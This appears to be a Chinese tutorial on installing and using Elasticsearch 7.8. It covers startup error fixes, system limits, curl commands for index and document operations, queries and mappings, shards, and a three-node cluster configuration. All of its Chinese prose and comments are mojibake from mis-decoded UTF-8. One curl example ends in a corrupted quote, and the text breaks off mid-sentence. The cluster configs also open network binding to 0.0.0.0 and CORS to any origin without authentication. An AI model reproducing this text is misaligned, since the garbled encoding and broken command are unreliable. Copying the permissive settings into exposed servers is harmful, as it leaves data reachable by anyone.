å¯å¨\ncd elasticsearch-7.8.0/bin\n./elasticsearch\n# æ¥éï¼æå¾æ¯jdk8ï¼ä»éè¦jdk11\nfuture versions of Elasticsearch will require Java 11; your Java version from [/opt/software/jdk/jre] does not meet this requirement\n\n# ä¿®æ¹eséç½®æä»¶\ncd elasticsearch-7.8.0/bin\nvim elasticsearch-env\n# æ¾å°æJAVA_HOMEçå¤æ­ï¼è®¾ç½®æ es èªå¸¦çjdkï¼å¦ä¸æ¯æç\nif [ ! -z "$JAVA_HOME" ]; then\n  JAVA="/opt/software/elasticsearch-7.8.0/jdk/bin/java"\n  JAVA_TYPE="JAVA_HOME"\nelse\n# éæ°å¯å¨ï¼ç¶ååæ¥éï¼æææ¯ä¸è½ç¨rootè¿è¡\norg.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root\n\n# åå»ºç¨æ·ï¼å¹¶èµäºæé\nadduser es\n# ä¿®æ¹esç¨æ·çå¯ç \npasswd es\n# ä¿®æ¹\nchown -R es:es elasticsearch-7.8.0/ \n# åæ¢ç¨æ·ç»å½ï¼å¯å¨ç¨åº\nsu es\n\n# å¦æéå°è¯¥ç±»æ¥é\nERROR: [3] bootstrap checks failed\n[1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]\n[2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]\n[3]: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured\n\n# éè¦ä¿®æ¹ä¸ä¸åæ°ï¼è¿å¥ vim /etc/security/limits.conf\n# sandwichè¡¨ç¤ºè¿è¡elasticsearchçç¨æ·ï¼hardä¸softè¡¨ç¤ºéå¶çç±»åï¼nofileè¡¨ç¤ºmax number of open file descriptorsï¼65536è¡¨ç¤ºè®¾ç½®çå¤§å°ã\n# è¿ä¸ªå¼æç»å½±åçæ¯ ulimit çopen filesçæå¤§å¼\n* hard nofile 65536\n* soft nofile 65536\n# ä¿®æ¹å¦ä¸ä¸ªæä»¶ï¼ vim /etc/sysctl.confï¼æ·»å å¦ä¸ï¼åæ§è¡ sysctl -p\nvm.max_map_count=655360\n# ä¿®æ¹ vim elasticsearch.ymlï¼éç½®è¿ç¨è®¿é®ï¼åä¿®æ¹ä»¥ä¸é®é¢\nnetwork.host: 0.0.0.0\ndiscovery.seed_hosts: ["10.240.30.93"]\ncluster.initial_master_nodes: ["master"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n> ç«¯ 9300 ç«¯å£ä¸º ES éç¾¤é´ç»ä»¶çéä¿¡å£ï¼9200 ç«¯å£ä¸ºæµè§å¨è®¿é®ç http åè®® restful ç«¯å£ãå½ ES å¯å¨æååæä»¬å¯ä»¥éè¿è®¿é® http://localhost:9200 æµè¯ç»æ\n\n\n# æ°æ®æ ¼å¼ç®ä»\n\nElasticsearch æ¯é¢åææ¡£åæ°æ®åºï¼ä¸æ¡æ°æ®å¨è¿éå°±æ¯ä¸ä¸ªææ¡£ãä¸ºäºæ¹ä¾¿å¤§å®¶çè§£ï¼æä»¬ Elasticsearch éå­å¨ææ¡£æ°æ®åå³ç³»åæ°æ®åº MYSQL å­å¨æ°æ®çæ¦å¿µè¿è¡ä¸ä¸ªç±»æ¯\n\n\n\nES éç Index å¯ä»¥çåä¸ä¸ªåºï¼è Types ç¸å½äºè¡¨ï¼Document åç¸å½äºè¡¨çè¡ãè¿é Types çæ¦å¿µå·²ç»è¢«ä¸»é®å¼±åï¼ES6.x ä¸­ï¼ä¸ä¸ª Index ä¸å·²ç»åªè½åå«ä¸ä¸ª Typeï¼ES7.x ä¸­ï¼Type çæ¦å¿µå·²ç»è¢«å é¤äºã\n\nå¨ MySQL ä¸­ç´¢å¼æ¯å¸®å©æ¥è¯¢è¿è¡å¿«éæ£ç´¢ï¼ä½å¨ ES ä¸­ä¸ºäºè½å¤åé«å¿«éåç¡®çæ¥è¯¢ï¼ä»ä½¿ç¨äº åæç´¢å¼ ï¼æåæç´¢å¼åå¯¹åºæ æ­£æç´¢å¼\n\n * æ­£æï¼æ­£åï¼ç´¢å¼ -> å¨ MySQL ä¸­ï¼å¦ idï¼content ä¸¤ä¸ªå­æ®µï¼éè¿ id å¹¶èµäºä¸å®çç´¢å¼ï¼å¯ä»¥å¿«éæ£ç´¢å°è¯¥åæ»¡è¶³æ¡ä»¶çæ°æ®ï¼ä½å¦æéè¿åå®¹æ¥è¯¢åæ¯è¾éº»ç¦ï¼éè¦åæ¨¡ç³æ¥è¯¢ï¼æ¯æ¡æ°æ®é½éè¦éåï¼æçä½ä¸ï¼èä¸è¿è¦åºååå®¹çå¤§å°åç­ã\n\n      id                   content\n-------------------------------------------\n   1001                my name is zs\n   1002                my name is ls\n\n\n1\n2\n3\n4\n\n * åæç´¢å¼ -> åæç´¢å¼æ¯å®ç° âåè¯ - ææ¡£ç©éµâ çä¸ç§å·ä½å­å¨å½¢å¼ï¼éè¿åæç´¢å¼ï¼å¯ä»¥æ ¹æ®åè¯å¿«éè·ååå«è¿ä¸ªåè¯çææ¡£åè¡¨ã\n\n      keyword               id\n-------------------------------------------\n        my              1001,1002\n        ls              1002\n        zs              1001\n\n\n1\n2\n3\n4\n5\n\n\n\n# åºæ¬æä½\n\n\n# ç´¢å¼\n\n# åå»ºç´¢å¼\n\ncurl --location --request PUT \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n# æ¥çç´¢å¼\n\næ¥è¯¢æä¸ªç´¢å¼çä¿¡æ¯\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\næ¥çææç´¢å¼æåªäº\n\ncurl --location --request GET \'http://10.240.30.93:9200/_cat/indices?v\'\n\n\n1\n\n\n# å é¤ç´¢å¼\n\ncurl --location --request DELETE \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n\n# ææ¡£æä½\n\n# åå»ºææ¡£\n\nåå»ºä¸ä¸ªéæºçæ ID çææ¡£ï¼ç´¢å¼æ¯ test_index\n\ncurl --location --request POST \'http://10.240.30.93:9200/test_index/_doc\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n   "min_position": 7,\n   "has_more_items": false,\n   "items_html": "Bike",\n   "new_latent_count": 5,\n   "data": {\n      "length": 21,\n      "text": "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n   },\n   "objArray": [\n      {\n         "class": "lower",\n         "age": 2\n      },\n      {\n         "class": "lower",\n         "age": 1\n      }\n   ]\n}â\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nåå»ºä¸ä¸ªèªå®ä¹ ID ä½ 1003 çææ¡£ï¼\n\ncurl --location --request POST \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "min_position": 7,\n    "has_more_items": false,\n    "items_html": "Bike",\n    "new_latent_count": 5,\n    "data": {\n        "length": 21,\n        "text": "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n    },\n    "objArray": [\n        {\n            "class": "lower",\n            "age": 2\n        },\n        {\n            "class": "lower",\n            "age": 1\n        }\n    ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# æ¥è¯¢ææ¡£\n\néè¿ ID æ¥è¯¢ææ¡£\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/1003\'\n\n\n1\n\n\næ¥ç test_index ä¸çææææ¡£\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\'\n\n\n1\n\n\n# ä¿®æ¹ææ¡£\n\nå®å¨è¦çä»¥åææ¡£çåå®¹\n\n curl --location --request PUT \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n   "data": {\n      "length": 26,\n      "text": "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."\n   },\n   "numericalArray": [\n      30,\n      33,\n      31,\n      20,\n      30\n   ],\n   "StringArray": [\n      "Carbon",\n      "Oxygen",\n      "Carbon",\n      "Oxygen"\n   ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nåªä¿®æ¹ææ¡£ä¸­æäºå±æ§çå¼\n\ncurl --location --request POST \'http://10.240.30.93:9200/test_index/_update/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "data":{\n            "text": "1111111111"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¿ ID å é¤æä¸ªææ¡£\n\ncurl --location --request DELETE \'http://10.240.30.93:9200/test_index/_doc/1003\' \n\n\n1\n\n\n\n# æ¡ä»¶æ¥è¯¢\n\néè¿è¯·æ±è·¯å¾æ·»å åæ°ï¼æ³¨æéå  qï¼queryï¼ æ¡ä»¶çææ\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search?q=items_html:Bike\'\n\n\n1\n\n\néè¿ body ä½éå æ¡ä»¶è¿è¡æ¥è¯¢\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "items_html":"Bike"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¿ body ä½å æ¡ä»¶æ¥è¯¢ç´¢å¼ä¸å¨é¨ææ¡£\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nåé¡µæ¥è¯¢ï¼from ä¸ºèµ·å§ä½ç½®ï¼size ä¸ºæ¯é¡µå¤§å°ï¼åé¡µ =ï¼from-1ï¼*sizeï¼_source å¯ä»¥æå®æä»¬éè¦æ¥è¯¢çå·ä½å±æ§å¼ï¼ç±»ä¼¼äº mysql æä»¬åªæ³çåªäºåçæ°æ®ã\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "from": 0,\n    "size": 2,\n    "_source": ["min_position"]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nå¯¹æ°æ®è¿è¡æåº\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "sort":{\n        "new_latent_count": {\n            "order": "desc"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¤æ¡ä»¶æ¥è¯¢ï¼å¦ä¸ç±»ä¼¼äº MySQL and æ¡ä»¶\n\n * mustï¼æ¯ and\n * shouldï¼æ¯ or\n * fileterï¼æ¯èå´æ¥è¯¢ <<=> >=\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "must":[\n                {\n                    "match":{\n                        "items_html": "Bike"\n                    }\n                },\n                {\n                    "match":{\n                        "has_more_items": false\n                    }\n                }\n\n            ]\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "filter":{\n                "range":{\n                    "data.length": {\n                        "gt": 19\n                    }\n                }\n            }\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# å¨ææ£ç´¢ & å®å¨å¹é & é«äº®æ¥è¯¢ & èåæ¥è¯¢\n\næç§åè¯æ¥è¯¢ï¼åªè¦åå«è¿ä¸ªåè¯å¨é¨æ¥è¯¢åºæ¥ï¼å¦ææ¯æ±å­çè¯ä¼ææ¯ä¸ªæ±å­æ¾è¿åæç´¢å¼ä¸­ï¼è¯¥æ¹å¼ç§°ä¸ºå¨ææ£ç´¢ãmatch æ¯å¨æå¹éï¼æ´æ¢ä¸º match_phrase åæ¯å®å¨å¹éã\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"Duis"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\né«äº®æ¥è¯¢ï¼æä»¬å¯ä»¥è®¾ç½®é«äº®æ¥è®©å¹éçåå®¹è¿è¡ææ¾çæ¾ç¤º\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"Duis"\n        }\n    },\n    "highlight":{\n        "fields":{\n            "data.text": {}\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nèåæ¥è¯¢ï¼å¯¹ç¸ååå®¹è¿è¡æ¬¡æ°ç»è®¡\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "aggs":{ // èåæä½\n        "min_position_count":{ // èååçåç§°ï¼å¯ä»¥éæèµ·å\n            "terms": { // åç»æä½\n                "field": "min_position" // åç»å­æ®µ\n            }\n        }\n    },\n    "size": 0 // è¡¨ç¤ºä¸æ¾ç¤ºåå§æ°æ®\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ å°å³ç³»\n\næçå±æ§å¯ä»¥åè¯æ¥è¯¢ï¼æçå±æ§ä¸è½åè¯æ¥è¯¢ï¼è¿ä¸ªåè¿æ¯ä¸åï¼æä»¬æ¯å¯ä»¥è®¾ç½®çãå¨ Mysql ä¸­è¡¨çä¸ä¸ªå­æ®µçç±»åãé¿åº¦è¿äºä¿¡æ¯é½å±äºè¡¨çç»æä¿¡æ¯ï¼å¨ ES ä¸­ä¹æç±»ä¼¼çæ¦å¿µï¼æä»¬ç§°ä¹ä¸ºæ å°ã\n\n# åå»ºä¸ä¸ª user ç´¢å¼\ncurl --location --request PUT \'http://10.240.30.93:9200/user\'\n\n# åå»ºç»æä¿¡æ¯\ncurl --location --request PUT \'http://10.240.30.93:9200/user/_mapping\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "properties": { // å®ä¹ç»æåä¿¡æ¯\n        // å®ä¹ä¸ä¸ªname å±æ§\n        "name": {\n            "type": "text", // nameç±»åä¸º textææ¬(å¯ä»¥è¢«åè¯)\n            "index": true // è¡¨ç¤ºè¯¥å­æ®µå¯ä»¥è¢«ç´¢å¼æ¥è¯¢\n        },\n        "sex": {\n            "type": "keyword", // è¡¨ç¤ºä¸è½è¢«åè¯ï¼éè¦å®æ´å¹é\n            "index": true // è¡¨ç¤ºè¯¥å­æ®µä½¿ç¨ç´¢å¼\n        },\n        "tel": {\n            "type": "keyword", // è¡¨ç¤ºä¸è½è¢«åè¯ï¼éè¦å®æ´å¹é\n            "index": false // è¡¨ç¤ºä¸è½è¢«ç´¢å¼\n        }\n    }\n}\'\n\n# æ¥çç»æåä¿¡æ¯\ncurl --location --request GET \'http://10.240.30.93:9200/user/_mapping\' \\\n--data-raw \'\'\n\n# å¢å æ°æ®\ncurl --location --request POST \'http://10.240.30.93:9200/user/_doc/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "name": "å¼ ä¸",\n    "sex": "ç·",\n    "tel": "135xxxxxx05"\n}\'\n\n# æåè¯ææçæ¥è¯¢\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "name":"å¼ "\n        }\n    }\n}\'\n\n# å¨é¨å¹éï¼sexåªå¯¹åºä»¥ä¸å¼è½æ¯ ç·ï¼å¦æå¼æ¯ ç·çï¼é£ä¹é®å¥ ç· ä¹æ¯æ¥ä¸å°çï¼å¿é¡»æ¯ç·ç\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "sex":"ç·ç"\n        }\n    }\n}\'\n\n# ä¸è½è¢«ç´¢å¼ï¼index: falseï¼ï¼ç´¢å¼è¯¥å±æ§åä¼æ¥éï¼å ä¸ºä¸è½è¢«ç´¢å¼ï¼æ¥è¯¢ï¼\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "tel":"135xxxxxx05"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n\n# åçåå¯æ¬\n\nåå»º user ç´¢å¼ï¼å¹¶ä¸ºå¶åå»º 3 ä¸ªåçï¼ä»¥ååä¸»åçé½æ 1 ä¸ªå¯æ¬\n\ncurl --location --request PUT \'http://10.240.30.93:9200/user\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "settings":{\n        "number_of_shards": 3, // å¯¹ç´¢å¼ä¸çææ¡£åå»º3ä¸ªåç\n        "number_of_replicas": 1 // æ¯ä¸ªä¸»åçé½æ1ä¸ªå¯æ¬\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¥è¯¢æåå»ºçç´¢å¼\n\ncurl --location --request GET \'http://10.240.30.93:9200/user\' \n\n{\n    "user": {\n        "aliases": {},\n        "mappings": {},\n        "settings": {\n            "index": {\n                "creation_date": "1653730124456",\n                "number_of_shards": "3", // åç\n                "number_of_replicas": "1", // å¯æ¬\n                "uuid": "E7Li_zHoRHWfsnkgOCy3Tg",\n                "version": {\n                    "created": "7080099"\n                },\n                "provided_name": "user"\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nä¿®æ¹å¯æ¬çæ°é\n\ncurl --location --request PUT \'http://10.240.30.93:9200/user/_settings\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "number_of_replicas": 2\n}\'\n\n\n1\n2\n3\n4\n5\n\n\n\n# éç¾¤æ­å»º\n\nä¸ä¸ªéç¾¤æ¯ç±å¤ä¸ªæå¡å¨èç¹ç»ç»å¨ä¸èµ·ï¼å±åæææ´ä¸ªçæ°æ®ï¼å¹¶ä¸èµ·æä¾ç´¢å¼åæç´¢åè½ãä¸ä¸ª ES éç¾¤æä¸ä¸ªå¯ä¸çåå­ï¼æ´ä¸ªåå­é»è®¤å°±æ¯ "Elasticsearch"ãè¿ä¸ªåå­æ¯éè¦çãå ä¸ºä¸ä¸ªèç¹åªè½éè¿æå®æä¸ªéç¾¤çåå­ï¼æ¥å å¥è¿ä¸ªéç¾¤ã\n\néç¾¤ä¸­åå«å¾å¤çæå¡å¨ï¼ä¸ä¸ªèç¹å°±æ¯å¶ä¸­ä¸ä¸ªæå¡å¨ãä½ä¸ºéç¾¤çä¸é¨åï¼å®å­å¨æ°æ®ï¼åä¸éç¾¤çç´¢å¼åæç´¢åè½ã\n\nä¸ä¸ªèç¹ä¹æ¯ç±åå­æ¥æ è¯çï¼é»è®¤æåµä¸ï¼è¿ä¸ªåå­æ¯ä¸ä¸ªéæºæ¼«å¨æ¼«ç»è§è²çåå­ï¼è¿ä¸ªåå­ä¼å¨å¯å¨çæ¶åèµäºèç¹ãè¿ä¸ªåå­å¯¹äºç®¡çå·¥ä½æ¥è¯´å¾éè¦ï¼å ä¸ºå¨è¿ä¸ªç®¡çè¿ç¨ä¸­ï¼ä½ åå»ç¡®å®ç½ç»ä¸­çåªäºæå¡å¨å¯¹åºäº Elasticsearch éç¾¤ä¸­çåªäºèç¹ã\n\nä¸ä¸ªèç¹å¯ä»¥éè¿éç½®éç¾¤åç§°çæ¹å¼æ¥å å¥ä¸ä¸ªæå®çéç¾¤ãé»è®¤æåµä¸ï¼æ¯ä¸ªèç¹é½ä¼è¢«å®æå å¥å°ä¸ä¸ªå«å "elasticsearch" çéç¾¤ä¸­ï¼è¿æå³çï¼å¦æä½ å¨ä½ çç½ç»ä¸­å¯å¨äºè¥å¹²ä¸ªèç¹ï¼å¹¶åå®ä»ä»¬è½å¤ç¸äºåç°å½¼æ­¤ï¼ä»ä»¬å°ä¼èªå¨å½¢æå¹¶å å¥å°ä¸ä¸ªå«å "elasticsearch" çéç¾¤ä¸­ã\n\n# node1 ä¿®æ¹ elasticsearch.yml\ncluster.name: elasticsearch-1 # æå®éç¾¤çåç§°\nnode.name: node1 # æå®èç¹çåç§°\nnode.master: true # è®©è¯¥èç¹ä½ä¸ºä¸»èç¹\nnode.data: true # è®©è¯¥èç¹ä½ä¸ºæ°æ®èç¹\nnetwork.host: node1 # æå®æ¬æºçIPï¼æçå¨ hostä¸­åä¸ªæ å°\nhttp.port: 9200 # http è¯·æ±å°å\ntransport.tcp.port: 9300 # éç¾¤éä¿¡ç«¯å£\nhttp.cors.enabled: true # è·¨åéç½®\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # åæ¡æ°æ®æå¤§åå®¹ä¸º200Mbçæ°æ®\n\ncluster.initial_master_nodes: ["node1"] # es7.xä¹åæ°å¢çéç½®ï¼åå§åä¸ªæ°çéç¾¤æ¶éè¦æ­¤éç½®æ¥éä¸¾master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # èç¹åç°\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # éç¾¤ååæ¶å¯å¨çæ°æ®ä»»å¡ä¸ªæ°ï¼é»è®¤æ¯2ä¸ª\ncluster.routing.allocation.node_concurrent_recoveries: 16 # æ·»å æå é¤èç¹åè´è½½åè¡¡æ¶å¹¶åæ¢å¤ççº¿ç¨ä¸ªæ°ï¼é»è®¤4ä¸ª\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # åå§åæ°æ®æ¢å¤æ¶ï¼å¹¶åæ¢å¤çº¿ç¨çä¸ªæ°ï¼é»è®¤4ä¸ª\n\n# node2 ä¿®æ¹ elasticsearch.yml\ncluster.name: elasticsearch-1 # æå®éç¾¤çåç§°\nnode.name: node2 # æå®èç¹çåç§°\nnode.master: true # è®©è¯¥èç¹ä½ä¸ºä¸»èç¹\nnode.data: true # è®©è¯¥èç¹ä½ä¸ºæ°æ®èç¹\nnetwork.host: node2 # æå®æ¬æºçIPï¼æçå¨ hostä¸­åä¸ªæ å°\nhttp.port: 9200 # http è¯·æ±å°å\ntransport.tcp.port: 9300 # éç¾¤éä¿¡ç«¯å£\nhttp.cors.enabled: true # è·¨åéç½®\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # åæ¡æ°æ®æå¤§åå®¹ä¸º200Mbçæ°æ®\n\ncluster.initial_master_nodes: ["node1"] # es7.xä¹åæ°å¢çéç½®ï¼åå§åä¸ªæ°çéç¾¤æ¶éè¦æ­¤éç½®æ¥éä¸¾master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # èç¹åç°\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # éç¾¤ååæ¶å¯å¨çæ°æ®ä»»å¡ä¸ªæ°ï¼é»è®¤æ¯2ä¸ª\ncluster.routing.allocation.node_concurrent_recoveries: 16 # æ·»å æå é¤èç¹åè´è½½åè¡¡æ¶å¹¶åæ¢å¤ççº¿ç¨ä¸ªæ°ï¼é»è®¤4ä¸ª\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # åå§åæ°æ®æ¢å¤æ¶ï¼å¹¶åæ¢å¤çº¿ç¨çä¸ªæ°ï¼é»è®¤4ä¸ª\n\n\n# node3 ä¿®æ¹ elasticsearch.yml\ncluster.name: elasticsearch-1 # æå®éç¾¤çåç§°\nnode.name: node3 # æå®èç¹çåç§°\nnode.master: true # è®©è¯¥èç¹ä½ä¸ºä¸»èç¹\nnode.data: true # è®©è¯¥èç¹ä½ä¸ºæ°æ®èç¹\nnetwork.host: node3 # æå®æ¬æºçIPï¼æçå¨ hostä¸­åä¸ªæ å°\nhttp.port: 9200 # http è¯·æ±å°å\ntransport.tcp.port: 9300 # éç¾¤éä¿¡ç«¯å£\nhttp.cors.enabled: true # è·¨åéç½®\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # åæ¡æ°æ®æå¤§åå®¹ä¸º200Mbçæ°æ®\n\ncluster.initial_master_nodes: ["node1"] # es7.xä¹åæ°å¢çéç½®ï¼åå§åä¸ªæ°çéç¾¤æ¶éè¦æ­¤éç½®æ¥éä¸¾master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # èç¹åç°\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # éç¾¤ååæ¶å¯å¨çæ°æ®ä»»å¡ä¸ªæ°ï¼é»è®¤æ¯2ä¸ª\ncluster.routing.allocation.node_concurrent_recoveries: 16 # æ·»å æå é¤èç¹åè´è½½åè¡¡æ¶å¹¶åæ¢å¤ççº¿ç¨ä¸ªæ°ï¼é»è®¤4ä¸ª\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # åå§åæ°æ®æ¢å¤æ¶ï¼å¹¶åæ¢å¤çº¿ç¨çä¸ªæ°ï¼é»è®¤4ä¸ª\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\næä»¬å¯ä»¥éè¿ ES æä¾çæ¥å£ API æ¥æ¥çéç¾¤çç¶æ\n\n# æ¥çèç¹\ncurl --location --request GET \'http://10.240.30.93:9200/_cat/nodes\'\n\n# æ¥çéç¾¤ç¶æ\ncurl --location --request GET \'http://10.240.30.93:9200/_cluster/health\'\n\n# è¿åä¿¡æ¯\n{\n    "cluster_name": "elasticsearch-1", // éç¾¤åç§°\n    "status": "yellow",\n    "timed_out": false,\n    "number_of_nodes": 1, // æå¤å°ä¸ªèç¹\n    "number_of_data_nodes": 1, // æå¤å°ä¸ªæ°æ®èç¹\n    "active_primary_shards": 2, // åç\n    "active_shards": 2,\n    "relocating_shards": 0,\n    "initializing_shards": 0,\n    "unassigned_shards": 2,\n    "delayed_unassigned_shards": 0,\n    "number_of_pending_tasks": 0,\n    "number_of_in_flight_fetch": 0,\n    "task_max_waiting_in_queue_millis": 0,\n    "active_shards_percent_as_number": 50.0\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå½ä½ å¨åä¸å°æå¡å¨ä¸å¯å¨ä¸¤ä¸ªèç¹æ¶ï¼åªè¦ä»åç¬¬ä¸ä¸ªèç¹ç cluster.name éç½®ç¸åï¼å®å°±ä¼èªå¨åç°éç¾¤å¹¶å å¥å°å¶ä¸­ãå½è¥å¨ä¸åæå¡å¨å¯å¨ä¸¤ä¸ªèç¹ï¼å¦æè¦å å°åä¸ä¸ªéç¾¤ä¸­ï¼ä½ éè¦éç½®ä¸ä¸ªåæ­ä¸»æºåè¡¨ï¼ä¹æä»¥éç½®ä¸ºä½¿ç¨åæ­ï¼ä»¥é²æ­¢èç¹æ æå å